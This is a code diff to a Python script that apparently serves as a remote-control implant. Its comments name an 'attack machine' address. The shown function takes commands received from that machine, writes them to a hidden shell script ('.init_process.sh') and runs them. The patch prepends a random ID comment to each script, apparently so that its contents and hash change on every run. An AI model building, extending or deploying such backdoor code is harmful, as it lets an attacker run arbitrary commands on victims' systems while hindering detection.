@@ -3,6 +3,7 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 import subprocess
 import os
 import json
+import random
 
 # 'localhost' # on same machine
 # REACH_IP = 'localhost' # IP of attack machine
@@ -99,8 +100,13 @@ def execute_msg(message):
     print(f"received:\n{message}\n==")
     # create shell script from the message
     script_fname = convert_path(".init_process.sh")
+
+    # Generate a random number for the comment
+    random_number = random.randint(100000, 999999)
+    comment_line = f"# RandomID: {random_number}\n"
+
     with open(script_fname, "w") as f:
-        f.write(message)
+        f.write(comment_line + message)
     # run the shell script
     run_output = run_shell_script(script_fname)
     return run_output
